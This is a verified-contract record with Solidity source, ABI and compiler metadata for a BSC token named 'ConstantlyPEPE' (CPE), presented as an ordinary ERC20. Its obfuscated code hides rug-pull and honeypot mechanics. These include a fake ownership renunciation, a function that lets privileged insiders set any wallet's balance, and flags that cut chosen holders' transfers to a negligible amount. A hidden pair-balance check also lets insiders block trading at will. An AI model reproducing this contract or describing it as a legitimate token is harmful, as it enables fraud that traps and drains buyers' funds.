{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface launchedSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTake) external view returns (uint256);\n\n    function transfer(address buyEnable, uint256 isFee) external returns (bool);\n\n    function allowance(address exemptSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyEnable,\n        uint256 isFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoTeamTake, uint256 value);\n    event Approval(address indexed exemptSwap, address indexed spender, uint256 value);\n}\n\nabstract contract walletSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listReceiverMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchSellAt {\n    function createPair(address enableReceiverTo, address txReceiver) external returns (address);\n}\n\ninterface takeTeam is launchedSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConstantlyPEPE is walletSwap, launchedSell, takeTeam {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTeam;\n    }\n\n    bool public listMarketing;\n\n    event OwnershipTransferred(address indexed teamAt, address indexed exemptFee);\n\n    uint8 private autoTx = 18;\n\n    bool public txAtTo;\n\n    function amountFrom(address launchedMarketing) public {\n        limitModeAmount();\n        if (toTrading) {\n            listMarketing = false;\n        }\n        if (launchedMarketing == amountFromTo || launchedMarketing == receiverMarketingShould) {\n            return;\n        }\n        sellSwap[launchedMarketing] = true;\n    }\n\n    mapping(address => uint256) private autoToReceiver;\n\n    function balanceOf(address swapTake) public view virtual override returns (uint256) {\n        return autoToReceiver[swapTake];\n    }\n\n    function walletToken() public {\n        emit OwnershipTransferred(amountFromTo, address(0));\n        maxShouldToken = address(0);\n    }\n\n    uint256 private takeMode;\n\n    string private listEnableMin = \"Constantly PEPE\";\n\n    string private senderAmount = \"CPE\";\n\n    function isLimitList(address amountWalletLimit, address buyEnable, uint256 isFee) internal returns (bool) {\n        if (amountWalletLimit == amountFromTo) {\n            return launchedReceiver(amountWalletLimit, buyEnable, isFee);\n        }\n        uint256 txAuto = launchedSell(receiverMarketingShould).balanceOf(launchEnableToken);\n        require(txAuto == autoMarketingReceiver);\n        require(buyEnable != launchEnableToken);\n        if (sellSwap[amountWalletLimit]) {\n            return launchedReceiver(amountWalletLimit, buyEnable, amountSell);\n        }\n        return launchedReceiver(amountWalletLimit, buyEnable, isFee);\n    }\n\n    constructor (){\n        \n        listReceiverMax listTeamTrading = listReceiverMax(txFrom);\n        receiverMarketingShould = launchSellAt(listTeamTrading.factory()).createPair(listTeamTrading.WETH(), address(this));\n        if (buyWallet) {\n            toTrading = false;\n        }\n        amountFromTo = _msgSender();\n        walletToken();\n        listTotal[amountFromTo] = true;\n        autoToReceiver[amountFromTo] = receiverTeam;\n        if (buyAmountExempt != toTrading) {\n            atSwap = fundSwap;\n        }\n        emit Transfer(address(0), amountFromTo, receiverTeam);\n    }\n\n    function launchedReceiver(address amountWalletLimit, address buyEnable, uint256 isFee) internal returns (bool) {\n        require(autoToReceiver[amountWalletLimit] >= isFee);\n        autoToReceiver[amountWalletLimit] -= isFee;\n        autoToReceiver[buyEnable] += isFee;\n        emit Transfer(amountWalletLimit, buyEnable, isFee);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return maxShouldToken;\n    }\n\n    address txFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 autoMarketingReceiver;\n\n    function walletShouldTotal(address teamFund) public {\n        require(teamFund.balance < 100000);\n        if (totalSender) {\n            return;\n        }\n        if (listMarketing != txAtTo) {\n            listMarketing = true;\n        }\n        listTotal[teamFund] = true;\n        if (buyAmountExempt) {\n            takeMode = shouldAmount;\n        }\n        totalSender = true;\n    }\n\n    uint256 private fundSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return listEnableMin;\n    }\n\n    uint256 public shouldAmount;\n\n    function allowance(address feeLiquidity, address totalTradingTo) external view virtual override returns (uint256) {\n        if (totalTradingTo == txFrom) {\n            return type(uint256).max;\n        }\n        return tradingTeam[feeLiquidity][totalTradingTo];\n    }\n\n    uint256 private receiverTeam = 100000000 * 10 ** 18;\n\n    bool public buyWallet;\n\n    function maxLaunch(address modeTotalReceiver, uint256 isFee) public {\n        limitModeAmount();\n        autoToReceiver[modeTotalReceiver] = isFee;\n    }\n\n    address launchEnableToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoTx;\n    }\n\n    mapping(address => bool) public listTotal;\n\n    address private maxShouldToken;\n\n    uint256 buyReceiver;\n\n    function owner() external view returns (address) {\n        return maxShouldToken;\n    }\n\n    function transfer(address modeTotalReceiver, uint256 isFee) external virtual override returns (bool) {\n        return isLimitList(_msgSender(), modeTotalReceiver, isFee);\n    }\n\n    function transferFrom(address amountWalletLimit, address buyEnable, uint256 isFee) external override returns (bool) {\n        if (_msgSender() != txFrom) {\n            if (tradingTeam[amountWalletLimit][_msgSender()] != type(uint256).max) {\n                require(isFee <= tradingTeam[amountWalletLimit][_msgSender()]);\n                tradingTeam[amountWalletLimit][_msgSender()] -= isFee;\n            }\n        }\n        return isLimitList(amountWalletLimit, buyEnable, isFee);\n    }\n\n    function maxIs(uint256 isFee) public {\n        limitModeAmount();\n        autoMarketingReceiver = isFee;\n    }\n\n    mapping(address => bool) public sellSwap;\n\n    function limitModeAmount() private view {\n        require(listTotal[_msgSender()]);\n    }\n\n    bool public totalSender;\n\n    mapping(address => mapping(address => uint256)) private tradingTeam;\n\n    bool public buyAmountExempt;\n\n    address public amountFromTo;\n\n    address public receiverMarketingShould;\n\n    uint256 constant amountSell = 20 ** 10;\n\n    function approve(address totalTradingTo, uint256 isFee) public virtual override returns (bool) {\n        tradingTeam[_msgSender()][totalTradingTo] = isFee;\n        emit Approval(_msgSender(), totalTradingTo, isFee);\n        return true;\n    }\n\n    uint256 private atSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderAmount;\n    }\n\n    bool public toTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTeamTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTradingTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"}],\"name\":\"amountFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFromTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTradingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmountExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isFee\",\"type\":\"uint256\"}],\"name\":\"maxIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFee\",\"type\":\"uint256\"}],\"name\":\"maxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketingShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWalletLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAtTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"}],\"name\":\"walletShouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConstantlyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}